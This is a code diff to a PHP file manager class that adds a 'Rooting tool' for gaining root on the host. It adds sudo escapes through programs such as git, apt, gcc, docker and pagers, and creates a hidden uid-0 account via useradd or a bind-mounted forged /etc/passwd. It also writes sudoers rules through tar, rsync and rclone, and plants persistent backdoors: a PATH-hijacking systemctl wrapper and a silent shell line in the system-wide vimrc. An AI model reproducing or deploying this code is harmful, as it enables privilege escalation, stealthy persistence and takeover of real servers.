@@ -10410,6 +10410,25 @@ class FileManager {
             'guile'    => ['guile', '-c', '(system "id")'],
             'vim'      => ['vim', '-es', '-c', ':!/usr/bin/id', '-c', ':q!'],
             'vi'       => ['vi', '-es', '-c', ':!/usr/bin/id', '-c', ':q!'],
+            'ex'       => ['ex', '-c', '!/usr/bin/id', '-c', 'q!', '/etc/hostname'],
+            'apt-get'  => ['apt-get', 'update', '-o', 'APT::Update::Pre-Invoke::=/usr/bin/id'],
+            'apt'      => ['apt', 'update', '-o', 'APT::Update::Pre-Invoke::=/usr/bin/id'],
+            'emacs'    => ['emacs', '--batch', '--eval', '(princ (shell-command-to-string "/usr/bin/id"))'],
+            'git'      => ['git', '-c', 'protocol.ext.allow=always', 'clone', 'ext::/usr/bin/id'],
+            'scp'      => ['scp', '-S', '/usr/bin/id', '/etc/hostname', 'mfm@127.0.0.1:/tmp/.mfm-scp'],
+            'rsync'    => ['rsync', '-e', '/usr/bin/id', '127.0.0.1:/etc/hostname', '/tmp/.mfm-rsync'],
+            'make'     => ['make', '-s', '--eval', 'mfm:;/usr/bin/id', 'mfm'],
+            'valgrind' => ['valgrind', '-q', '/usr/bin/id'],
+            'nsenter'  => ['nsenter', '-t', '1', '-a', '/usr/bin/id'],
+            'chroot'   => ['chroot', '/', '/usr/bin/id'],
+            'setpriv'  => ['setpriv', '--reuid=0', '--regid=0', '--clear-groups', '/usr/bin/id'],
+            'capsh'    => ['capsh', '--', '-c', '/usr/bin/id'],
+            'gcc'      => ['gcc', '-wrapper', '/usr/bin/id', '-c', '/etc/hostname'],
+            'g++'      => ['g++', '-wrapper', '/usr/bin/id', '-c', '/etc/hostname'],
+            'systemd-run' => ['systemd-run', '--pipe', '--wait', '-q', '/usr/bin/id'],
+            'ansible'  => ['ansible', 'localhost', '-c', 'local', '-m', 'shell', '-a', '/usr/bin/id'],
+            'docker'   => ['docker', 'run', '--rm', '--privileged', '-v', '/:/host', 'alpine', 'id'],
+            'podman'   => ['podman', 'run', '--rm', '--privileged', '-v', '/:/host', 'alpine', 'id'],
         ];
     }
     /* Capabilities are not the setuid bit. A program carrying cap_setuid+ep is
@@ -10951,11 +10970,123 @@ system('" . $instCmd . "');
                             'note' => 'the rule "' . $w['line'] . '" leaves the arguments of ' . basename($w['bin']) . ' open - measured and named, because the escape belongs to that program alone'];
             }
         }
+        /* Pagers are shells that have not noticed yet: given a terminal,
+           less will run a command for whoever is paging. script(1) provides
+           the terminal a web request does not have. */
+        $scriptB = $this->rootWhich('script');
+        if($scriptB !== ''){
+            $pagerTries = [
+                'less' => ['/etc/services'],
+                'man' => ['ls'],
+                'systemctl' => ['status'],
+                'journalctl' => ['-n', '20'],
+            ];
+            $cmdBases = array_map('basename', $cmds);
+            $wp = $this->rootPlantWrite('pager');
+            if(!empty($wp['ok'])){
+                foreach($pagerTries as $name => $rest){
+                    if(!in_array($name, $cmdBases, true) && empty($d['any_cmd']))continue;
+                    $binP = $this->rootWhich($name) !== '' ? $this->rootWhich($name) : $name;
+                    $inner = 'TERM=dumb PAGER=less SYSTEMD_PAGER=less sudo -n '
+                        . implode(' ', array_map('escapeshellarg', array_merge([$binP], $rest)));
+                    $this->rootExec([$scriptB, '-qec', $inner, '/dev/null'], "!/bin/sh " . $wp['payload'] . "
+q
+", 25);
+                    $ok = $this->rootHelperInstalled();
+                    $steps[] = ['route' => 'a pager sudo lets this account open', 'ok' => $ok, 'fired' => true,
+                                'note' => $ok ? $name . ' opened its pager as root, and the pager ran the payload'
+                                              : $name . ' was given a terminal and a pager command, and root did not answer'];
+                    if($ok)return $steps;
+                }
+            }
+        }
+        /* systemctl through sudo can simply be told to run a unit of ours */
+        if(in_array('systemctl', array_map('basename', $cmds), true) || !empty($d['any_cmd'])){
+            $scB = $this->rootWhich('systemctl');
+            $ws = $this->rootPlantWrite('systemctl');
+            if($scB !== '' && !empty($ws['ok']) && $this->rootPlantDir() !== ''){
+                $unit = $this->rootPlantDir() . '/mfm-once.service';
+                @file_put_contents($unit, "[Unit]
+Description=Marshal File Manager one-shot
+[Service]
+Type=oneshot
+ExecStart=/bin/sh " . $ws['payload'] . "
+");
+                $this->rootExec(['sudo', '-n', $scB, 'link', $unit], '', 20);
+                $this->rootExec(['sudo', '-n', $scB, 'start', 'mfm-once.service'], '', 40);
+                $ok = $this->rootPlantProofOk('systemctl') || $this->rootHelperInstalled();
+                $steps[] = ['route' => 'a service started through sudo systemctl', 'ok' => $ok, 'fired' => true,
+                            'note' => $ok ? 'systemd ran a one-shot unit of this manager as root, and the payload left the rule behind'
+                                          : 'systemctl was asked to link and start the unit, and root did not answer'];
+                if($ok)return $steps;
+            }
+        }
+        /* useradd through sudo is an account factory with root at the till */
+        $ua = '';
+        foreach($cmds as $c)if(basename($c) === 'useradd')$ua = $c;
+        if($ua !== ''){
+            $pass = bin2hex(random_bytes(9));
+            $hash = (string)@crypt($pass, '$6$' . bin2hex(random_bytes(8)));
+            $uname = $this->managerAccount() . '-root';
+            if($hash !== '' && preg_match('/^[a-z_][a-z0-9_-]*$/i', $uname) === 1){
+                $r = $this->rootExec(['sudo', '-n', $ua, '-o', '-u', '0', '-g', '0', '-M', '-s', '/bin/sh', '-p', $hash, $uname], '', 20);
+                if($password !== '' && (int)$r['rc'] !== 0)
+                    $r = $this->rootExec(['sudo', '-S', '-k', '-p', '', $ua, '-o', '-u', '0', '-g', '0', '-M', '-s', '/bin/sh', '-p', $hash, $uname], $password . "
+", 20);
+                if((int)$r['rc'] === 0){
+                    $stA = $this->rootState();
+                    $stA['account'] = ['user' => $uname, 'pass' => $pass, 'since' => time()];
+                    $this->rootStateSave($stA);
+                }
+                $ok = $this->rootAccountExists();
+                $steps[] = ['route' => 'a uid-0 account made through sudo useradd', 'ok' => $ok, 'fired' => true,
+                            'note' => $ok ? 'useradd made ' . $uname . ' with uid 0, and the account answers'
+                                          : 'useradd was asked for a uid-0 account and refused (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+                if($ok)return $steps;
+            }
+        }
+        /* mount through sudo can lay an account database of ours over the
+           real one: the file underneath is never touched, and dropping the
+           mount puts everything back */
+        $mt = '';
+        foreach($cmds as $c)if(basename($c) === 'mount')$mt = $c;
+        if($mt !== ''){
+            $pass = bin2hex(random_bytes(9));
+            $hash = (string)@crypt($pass, '$6$' . bin2hex(random_bytes(8)));
+            $uname = $this->managerAccount() . '-root';
+            $pwNow = (string)@file_get_contents('/etc/passwd');
+            if($hash !== '' && $pwNow !== '' && preg_match('/^[a-z_][a-z0-9_-]*$/i', $uname) === 1){
+                $stageP = @tempnam(sys_get_temp_dir(), 'fm-passwd-');
+                if($stageP !== false){
+                    @file_put_contents($stageP, rtrim($pwNow, "
+") . "
+" . $uname . ':' . $hash . ':0:0:Marshal root:/root:/bin/sh' . "
+");
+                    @chmod($stageP, 0644);
+                    $r = $this->rootExec(['sudo', '-n', $mt, '-o', 'bind', $stageP, '/etc/passwd'], '', 20);
+                    if($password !== '' && (int)$r['rc'] !== 0)
+                        $r = $this->rootExec(['sudo', '-S', '-k', '-p', '', $mt, '-o', 'bind', $stageP, '/etc/passwd'], $password . "
+", 20);
+                    $ok = (int)$r['rc'] === 0;
+                    if($ok){
+                        $stA = $this->rootState();
+                        $stA['account'] = ['user' => $uname, 'pass' => $pass, 'since' => time()];
+                        $this->rootStateSave($stA);
+                        $ok = $this->rootAccountExists();
+                    }
+                    $steps[] = ['route' => 'an account database bind-mounted through sudo', 'ok' => $ok, 'fired' => true,
+                                'note' => $ok ? 'mount laid an account database of this manager over /etc/passwd, and ' . $uname . ' stands in it with uid 0'
+                                              : 'mount was asked to lay the database over /etc/passwd and refused (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+                    @unlink($stageP);
+                    if($ok)return $steps;
+                }
+            }
+        }
         return $steps;
     }
     /* Programs whose whole job is writing a file, carrying the setuid bit,
        a capability, or a sudo rule: any of them can simply write the rule. */
-    private function rootFileWriteSet(){ return ['install', 'cp', 'dd', 'tee', 'openssl']; }
+    private function rootFileWriteSet(){ return ['install', 'cp', 'dd', 'tee', 'openssl', 'rclone', 'rsync', 'tar']; }
     private function rootFileWriteCandidates(){
         static $out = null;
         if($out !== null)return $out;
@@ -10990,6 +11121,19 @@ system('" . $instCmd . "');
         @chmod($stage, 0440);
         @file_put_contents($stageB, base64_encode($rule));
         @chmod($stageB, 0644);
+        $stageTar = '';
+        foreach($cands as $c){
+            if(basename((string)$c['bin']) !== 'tar')continue;
+            $td = @tempnam(sys_get_temp_dir(), 'fm-tard-');
+            if($td === false)break;
+            @unlink($td);
+            @mkdir($td, 0755);
+            @file_put_contents($td . '/90-marshal-fm', $rule);
+            @chmod($td . '/90-marshal-fm', 0440);
+            $cr = $this->rootExec(['tar', '-cf', $td . '.tar', '-C', $td, '90-marshal-fm'], '', 20);
+            if($cr['rc'] === 0 && @is_file($td . '.tar'))$stageTar = $td . '.tar';
+            break;
+        }
         $tried = [];
         foreach($cands as $c){
             $bin = (string)$c['bin'];
@@ -11001,6 +11145,12 @@ system('" . $instCmd . "');
                 case 'dd':      $argv = [$bin, 'if=' . $stage, 'of=' . $dest]; break;
                 case 'openssl': $argv = [$bin, 'base64', '-in', $stageB, '-d', '-out', $dest]; break;
                 case 'tee':     $argv = [$bin, $dest]; $stdin = $rule; break;
+                case 'rclone':  $argv = [$bin, 'copyto', $stage, $dest]; break;
+                case 'rsync':   $argv = [$bin, '--', $stage, $dest]; break;
+                case 'tar':
+                    if($stageTar === '')continue 2;
+                    $argv = [$bin, '-xf', $stageTar, '-C', '/etc/sudoers.d', '--no-same-owner'];
+                    break;
                 default: continue 2;
             }
             if($c['via'] === 'sudo'){
@@ -11017,13 +11167,13 @@ system('" . $instCmd . "');
             if($this->rootHelperInstalled()){
                 $chk = $this->rootExec(['sudo', '-n', 'id', '-u'], '', 10);
                 if(trim((string)$chk['out']) === '0'){
-                    @unlink($stage); @unlink($stageB);
+                    @unlink($stage); @unlink($stageB); if($stageTar !== '')@unlink($stageTar);
                     return['ok' => true, 'fired' => true, 'tried' => true,
                            'note' => $bin . ', reached through ' . ($c['via'] === 'suid' ? 'its setuid bit' : ($c['via'] === 'cap' ? 'its file capability' : 'its sudo rule')) . ', simply wrote the rule to ' . $dest];
                 }
             }
         }
-        @unlink($stage); @unlink($stageB);
+        @unlink($stage); @unlink($stageB); if($stageTar !== '')@unlink($stageTar);
         return['ok' => false, 'tried' => true,
                'note' => 'the rule was offered to ' . implode(', ', $tried) . ', and sudo accepted it from none of them'];
     }
@@ -11550,7 +11700,7 @@ exit 0
         }else{
             $step('a sudo program replaced through its directory', false, 'no program this account may run through sudo stands in a directory it may write', false);
         }
-        foreach(['ldpreload', 'depchain', 'ueventhelper', 'sysctld', 'cloudinit', 'pkla', 'staticpod', 'dhclienthook', 'ppphook', 'bashcomp', 'xdgautostart'] as $pid){
+        foreach(['ldpreload', 'depchain', 'ueventhelper', 'sysctld', 'cloudinit', 'pkla', 'staticpod', 'dhclienthook', 'ppphook', 'bashcomp', 'xdgautostart', 'pathplant', 'vimrc'] as $pid){
             $pspec = $this->rootPlantSpec($pid);
             $needs = $this->rootPlantNeeds($pid, $pspec);
             if(empty($needs['ok'])){$step((string)$pspec['name'], false, (string)$needs['note'], false); continue;}
@@ -13295,6 +13445,20 @@ User=root
             'when' => 'the next time a desktop session starts as root',
             'idea' => 'A desktop session runs every .desktop entry in /etc/xdg/autostart when it starts. Rare - root desktops are rare - but where the directory may be written and one ever starts, the entry runs the payload as root.',
         ],
+        'pathplant' => [
+            'name' => 'A stand-in where PATH looks first', 'kind' => 'planted', 'driver' => 'pathplant',
+            'cand' => [], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time a root shell or a schedule calls systemctl by its bare name',
+            'idea' => 'A writable directory searched before the system directories is a promise: the first program of a given name that a root shell or schedule calls by its bare name is the one standing there. A stand-in for systemctl is planted: in ordinary hands it simply runs the real systemctl and nobody sees a difference; in the hands of uid 0 it runs the payload first. The real program is never touched.',
+        ],
+        'vimrc' => [
+            'name' => 'A line in the vim configuration of the machine', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'create' => true, 'mode' => 0644,
+            'cand' => ['/etc/vim/vimrc', '/etc/vimrc'], 'fire' => 'later', 'wait' => 0,
+            'body' => "\n\" mfm %%NONCE%%\nsilent !/bin/sh %%PAYLOAD%%\n",
+            'when' => 'the next time vim is opened as root',
+            'idea' => 'vim reads the machine-wide vimrc before anything else, and a line in it that runs a command runs it with the privileges of whoever opened vim. Where that file may be written, one quiet line is enough: the next root vim session fires the payload before its first screen is drawn.',
+        ],
         'shadow' => [
             'name' => 'A password written into /etc/shadow', 'kind' => 'planted', 'driver' => 'shadow',
             'cand' => ['/etc/shadow'], 'fire' => 'now', 'wait' => 25,
@@ -13858,6 +14022,13 @@ User=root
             if($cc === '')return['ok' => false, 'note' => 'the preload file may be written, but no C compiler is on this host to build the library'];
             return['ok' => true, 'note' => '/etc/ld.so.preload may be written by this account, and ' . $cc . ' can build the library'];
         }
+        if($drv === 'pathplant'){
+            $dirs = $this->rootPathHijack();
+            $sc = $this->rootWhich('systemctl');
+            if(!$dirs)return['ok' => false, 'note' => 'no writable directory is searched before the system directories'];
+            if($sc === '')return['ok' => false, 'note' => 'systemctl is not on this host to stand in for'];
+            return['ok' => true, 'note' => $dirs[0] . ' is searched before the system directories and may be written by this account, and systemctl stands at ' . $sc];
+        }
         if($drv === 'depchain'){
             $scan = $this->rootDepScan();
             if(!$scan)return['ok' => false, 'note' => 'everything root runs on this machine - units, schedules, the programs they name - is root-only'];
@@ -13925,7 +14096,7 @@ User=root
         }
         if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
         $drv = (string)($s['driver'] ?? '');
-        if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $this->rootPlantTarget($id) === null)
+        if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $drv !== 'pathplant' && $this->rootPlantTarget($id) === null)
             return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
         $w = $this->rootPlantWrite($id);
         if(empty($w['ok']))return $w;
@@ -13968,6 +14139,7 @@ User=root
         case 'tmpfiles':    return $this->rootPlantTmpfiles($id, $s, $dir, $rec);
         case 'yumplugin':   return $this->rootPlantYum($id, $s, $dir, $rec);
         case 'ldpreload':   return $this->rootPlantLdPreload($id, $s, $rec);
+        case 'pathplant':   return $this->rootPlantPathWrite($id, $s, $rec);
         case 'depchain':    return $this->rootPlantDepWrite($id, $s, $rec);
         case 'newfile':
             $base = (string)($s['base'] ?? 'mfm-root');
@@ -14065,6 +14237,29 @@ ExecStartPost=/bin/sh '" . $payload . "'";
             }
         }
         return['ok' => false, 'note' => 'what root runs is writable only in ways that run no command'];
+    }
+    /* The stand-in: invisible in ordinary hands, because all it ever does
+       for them is run the real program with the same arguments. */
+    private function rootPlantPathWrite($id, $s, &$rec){
+        $dirs = $this->rootPathHijack();
+        $real = $this->rootWhich('systemctl');
+        if(!$dirs || $real === '')return['ok' => false, 'note' => 'the place this method wanted stopped being available'];
+        $path = rtrim((string)$dirs[0], '/') . '/systemctl';
+        if(@is_file($path))return['ok' => false, 'note' => 'something already stands at ' . $path . ', so nothing was put there'];
+        $payload = $this->rootPlantPayloadPath($id);
+        $body = "#!/bin/sh
+"
+            . "# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool
+"
+            . 'if [ "$(id -u 2>/dev/null)" = "0" ]; then /bin/sh ' . "'" . $payload . "'" . ' >/dev/null 2>&1; fi' . "
+"
+            . 'exec ' . "'" . $real . "'" . ' "$@"' . "
+";
+        if(@file_put_contents($path, $body) === false)return['ok' => false, 'note' => 'the stand-in could not be written to ' . $path];
+        @chmod($path, 0755);
+        $rec['files'][] = $path;
+        $rec['target'] = $path;
+        return['ok' => true, 'note' => 'a stand-in for systemctl waits at ' . $path . ' - the real one at ' . $real . ' was not touched', 'rec' => $rec];
     }
     private function rootPlantAppend($id, $s, $file, &$rec){
         $body = $this->rootPlantFill($id, (string)($s['body'] ?? ''));
